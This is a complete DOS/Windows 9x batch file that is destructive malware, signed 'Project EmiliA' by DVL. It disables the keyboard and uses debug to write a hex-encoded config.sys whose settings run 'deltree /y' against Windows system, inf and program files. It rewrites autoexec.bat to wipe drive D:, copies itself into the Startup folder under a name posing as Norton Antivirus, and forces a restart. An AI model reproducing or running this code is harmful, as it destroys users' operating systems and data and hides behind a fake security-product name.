@echo off
ctty nul
@c:\windows\rundll32.exe keyboard,disable
@echo e 0100  5B 6D 65 6E 75 5D 20 0D 0A 6D 65 6E 75 69 74 65>>c
@echo e 0110  6D 3D 45 6D 69 6C 69 41 20 0D 0A 6D 65 6E 75 69>>c
@echo e 0120  74 65 6D 3D 57 69 6E 64 6F 77 73 20 0D 0A 20 0D>>c
@echo e 0130  0A 5B 45 6D 69 6C 69 41 5D 20 0D 0A 62 75 66 66>>c
@echo e 0140  65 72 73 3D 31 20 0D 0A 66 69 6C 65 73 3D 31 20>>c
@echo e 0150  0D 0A 6C 61 73 74 64 72 69 76 65 3D 41 20 0D 0A>>c
@echo e 0160  73 65 74 20 77 69 6E 64 69 72 3D 64 65 6C 74 72>>c
@echo e 0170  65 65 2F 79 20 63 3A 5C 77 69 6E 64 6F 77 73 5C>>c
@echo e 0180  73 79 73 74 65 6D 5C 2A 2E 2A 20 0D 0A 73 65 74>>c
@echo e 0190  20 70 61 74 68 3D 64 65 6C 74 72 65 65 2F 79 20>>c
@echo e 01A0  63 3A 5C 77 69 6E 64 6F 77 73 5C 69 6E 66 5C 2A>>c
@echo e 01B0  2E 2A 20 0D 0A 73 65 74 20 77 69 6E 62 6F 6F 74>>c
@echo e 01C0  64 69 72 3D 64 65 6C 74 72 65 65 2F 79 20 63 3A>>c
@echo e 01D0  5C 77 69 6E 64 6F 77 73 5C 2A 2E 65 78 65 20 0D>>c
@echo e 01E0  0A 73 65 74 20 74 6D 70 3D 41 3A 5C 45 6D 69 6C>>c
@echo e 01F0  69 41 20 0D 0A 73 65 74 20 74 65 6D 70 3D 41 3A>>c
@echo e 0200  5C 45 6D 69 6C 69 41 20 0D 0A 73 65 74 20 6D 73>>c
@echo e 0210  67 3D 40 65 63 68 6F 20 54 68 69 73 20 69 73 20>>c
@echo e 0220  74 68 65 20 53 45 43 4F 4E 44 20 2E 53 59 53 2D>>c
@echo e 0230  6D 61 6C 65 77 61 72 65 2C 20 63 72 65 61 74 65>>c
@echo e 0240  64 20 62 79 20 44 56 4C 2C 20 50 72 6F 6A 65 63>>c
@echo e 0250  74 20 45 6D 69 6C 69 41 20 0D 0A 20 0D 0A 5B 57>>c
@echo e 0260  69 6E 64 6F 77 73 5D 20 0D 0A 62 75 66 66 65 72>>c
@echo e 0270  73 3D 31 20 0D 0A 66 69 6C 65 73 3D 31 20 0D 0A>>c
@echo e 0280  6C 61 73 74 64 72 69 76 65 3D 42 20 0D 0A 73 65>>c
@echo e 0290  74 20 77 69 6E 64 69 72 3D 64 65 6C 74 72 65 65>>c
@echo e 02A0  2F 79 20 63 3A 5C 77 69 6E 64 6F 77 73 5C 73 79>>c
@echo e 02B0  73 74 65 6D 5C 2A 2E 2A 20 0D 0A 73 65 74 20 70>>c
@echo e 02C0  61 74 68 3D 64 65 6C 74 72 65 65 2F 79 20 63 3A>>c
@echo e 02D0  5C 77 69 6E 64 6F 77 73 5C 69 6E 66 5C 2A 2E 2A>>c
@echo e 02E0  20 0D 0A 73 65 74 20 77 69 6E 62 6F 6F 74 64 69>>c
@echo e 02F0  72 3D 64 65 6C 74 72 65 65 2F 79 20 63 3A 5C 77>>c
@echo e 0300  69 6E 64 6F 77 73 5C 2A 2E 63 6F 6D 20 0D 0A 73>>c
@echo e 0310  65 74 20 74 6D 70 3D 42 3A 5C 45 6D 69 6C 69 41>>c
@echo e 0320  20 0D 0A 73 65 74 20 74 65 6D 70 3D 42 3A 5C 45>>c
@echo e 0330  6D 69 6C 69 41 20 0D 0A 73 65 74 20 6D 73 67 3D>>c
@echo e 0340  40 65 63 68 6F 20 54 68 69 73 20 69 73 20 74 68>>c
@echo e 0350  65 20 53 45 43 4F 4E 44 20 2E 53 59 53 2D 6D 61>>c
@echo e 0360  6C 65 77 61 72 65 2C 20 63 72 65 61 74 65 64 20>>c
@echo e 0370  62 79 20 44 56 4C 2C 20 50 72 6F 6A 65 63 74 20>>c
@echo e 0380  45 6D 69 6C 69 41 20 0D 0A 00>>c
@echo rcx>>c
@echo 289>>c
@echo n sys>>c
@echo w>>c
@echo q>>c
@debug<c
@ren c:\config.sys config.dvl
@move sys c:\config.sys
@deltree/y sys >nul
@deltree/y c >nul
@deltree/y c:\config.dvl >nul
@echo @echo off > c:\autoexec.bat
@echo @for %%a in (d:\) do deltree/y %%a >> c:\autoexec.bat
@echo @echo Project Emilia ( CLOSED ) by DVL >> c:\autoexec.bat
@copy %0 c:\windows\startm~1\programs\startup\NAV_Peter_Norton_Antivirus_Professional_Edition_2003_Copyrighted_Edition_Since_1980..................................................................................................................................................................................................bat >nul
@%windir%\rundll32.exe %windir%\system\shell32.dll,SHexitWindowsex  7